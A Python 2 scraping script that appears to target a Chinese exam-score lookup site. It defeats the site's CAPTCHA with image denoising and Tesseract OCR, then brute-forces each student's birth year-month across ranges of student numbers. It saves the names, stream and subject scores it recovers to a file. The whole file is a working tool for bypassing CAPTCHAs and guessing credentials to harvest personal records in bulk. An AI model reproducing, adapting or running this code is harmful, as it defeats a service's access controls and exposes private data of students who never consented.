# -*- coding: utf-8 -*-

# package import
import urllib, urllib2, cookielib
import pytesseract
from PIL import Image

import sys
reload(sys)
sys.setdefaultencoding( "utf-8" )

# my pyfiles
from config import *
import denoise



# functions
def getCheckcode() :
    """
    Use 'checkcode.jpg'
    return the string it contains
    """
    img = Image.open(checkcode_file)
    img.load()
    img = denoise.denoise(img)
    tmp = pytesseract.image_to_string(img, config = "-psm 7 digits")
    ret = tmp
    number = "0123456789"
    for c in tmp :
        if c not in number :
            ret = ret.replace(c, '')
    return ret

def addBirthday(bir) :
    """
    Add birthday and return next birthday
    """
    bir += 1
    if bir % 100 == 13 :
        bir = ((bir / 100) + 1) * 100 + 1
    return bir

def getSubjectDetails(x) :
    p = x.find("cj")
    k = x.find('"', p)
    s = x.find('"', k + 1)
    e = x.find('"', s + 1)
    ret = x[s + 1 : e]
    x = x[e + 1 : ]
    return (ret, x)

def getDetail(student, birth, result) :
    """
    Change the result into standard format
    studentnumber 0000 Fail None 0 0 0 0 0
    or
    studentnumber birth Category name YuWen ShuXue ZongHE YingYu ZongFen 
    """
    ret = unicode(student) + u" " + unicode(birth)
    if "Fail" in result :
        ret = ret + " " + unicode("Fail None 0 0 0 0 0")
    else :
#         get wenke or like
        cat = ""
        if "\u7406\u79d1" in result :
            cat = "\u7406\u79d1"
        else :
            cat = "\u6587\u79d1"
        ret = ret + u" " + unicode(cat)
        
#         get name
        k = result.find("name")
        k = result.find('"', k)
        s = result.find('"', k + 1)
        e = result.find('"', s + 1)
#         print "Debug:", result, s, e
        ret = ret + u" " + unicode(result[s + 1 : e])
#         print unicode(result[s + 1 : e])
        result = result[e:]
        
        for times in range(0, 5) :
#             get each subject's score
            tmp = ""
            tmp, result = getSubjectDetails(result)
            ret = ret + u" " + unicode(tmp)
    ret = ret.decode("unicode_escape")
    return ret
    

def getScore(student, birS, birE) :
    """
    student - student number
    birS, birE - birthday start day and end day
    try each birthday and try to fetch score from 5184
    """
    count_try_bir = 0
    succeed = False
    ret = "Fail"
    rightBir = "0000"
    while count_try_bir < TIMES_TRY_BIRTHDAY :
        count_try_bir += 1
        bir = birS
        while bir != birE and (not succeed) :
            print bir
            result = ""
    #         get checkcode.jpg
    #         urllib.urlretrieve(checkcode_url, checkcode_file)
            checkcode_succeed = False
            count_try_checkcode = 0
            while (not checkcode_succeed) and (count_try_checkcode < TIMES_TRY_CHECKCODE) :
                count_try_checkcode += 1
                try :
                    post_data = None
                    request = urllib2.Request(checkcode_url, post_data, getCheckcode_headers)
                    response = opener.open(request, timeout=300)
                    checkcode = open(checkcode_file, "wb")
                    checkcode.write(response.read())
                    checkcode.close()
                    
                    user_checkcode = getCheckcode()
                    data = {
                                  "csny":str(bir),
                                  "zkzh":str(student),
                                  "yzm":user_checkcode
                                  }
                    post_data = urllib.urlencode(data)
                    request = urllib2.Request(query_url, post_data, query_headers)
                    response = opener.open(request, timeout=300)
                    result = response.read()
                    print student, bir, user_checkcode, result
                except Exception as e :
                    print e, 'fail try'
                
                if wrong_checkcode not in result :
                    checkcode_succeed = True
                    break
            
            if (busy_server not in result) and (success_feedback in result) :
                succeed = True
                ret = result
                rightBir = bir
                break
            
            bir = addBirthday(bir)
        
        if succeed == True :
            break
    
    ret = getDetail(student, rightBir, ret)
    return ret


# build opener
cookie = cookielib.MozillaCookieJar(cookie_file)
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))

print "Spider begin:"

# main procedure
post_data = None
try :
    request = urllib2.Request(query_web_url, post_data, default_headers)
    response = opener.open(request, timeout=100)
    print "Successfully open query web."
except Exception as e :
    print e
    exit(0)

student_range = raw_input("Please tell me the range of student_number(begin_number end_number): ")
student_range = student_range.split(' ')
begin_number = int(student_range[0])
end_number = int(student_range[1])
end_number += 1
   
birthday_range = raw_input("Please tell me the range of students' birthday (like:9701 9806): ")
birthday_range = birthday_range.split(' ')
birthday_begin = int(birthday_range[0])
birthday_end = int(birthday_range[1])
birthday_end = addBirthday(birthday_end)

# begin_number = 2000102442
# end_number= 2000102443
# birthday_begin = 9801
# birthday_end = 9802
  
for student_number in range(begin_number, end_number) :
    result = getScore(student_number, birthday_begin, birthday_end)
    file_handler = open(result_file, "a")
    print result
    file_handler.write(result + "\n")
    file_handler.close()

# request = urllib2.Request(checkcode_url, post_data, getCheckcode_headers)
# response = opener.open(request, timeout=1000)
# checkcode = open(checkcode_file, "wb")
# checkcode.write(response.read())
# checkcode.close()
# # print "Successfully download checkcode."
#    
# user_checkcode = getCheckcode()
# print user_checkcode
# first_data = {
#               "csny":"9801",
#               "zkzh":"2000102442",
#               "yzm":user_checkcode
#               }
# post_data = urllib.urlencode(first_data)
# request = urllib2.Request(query_url, post_data, query_headers)
# response = opener.open(request, timeout=1000)
# print response.read()
# result = unicode(response.read())
# print result.decode("unicode_escape")

cookie.save(ignore_discard=True, ignore_expires=True)

# main prpcedure
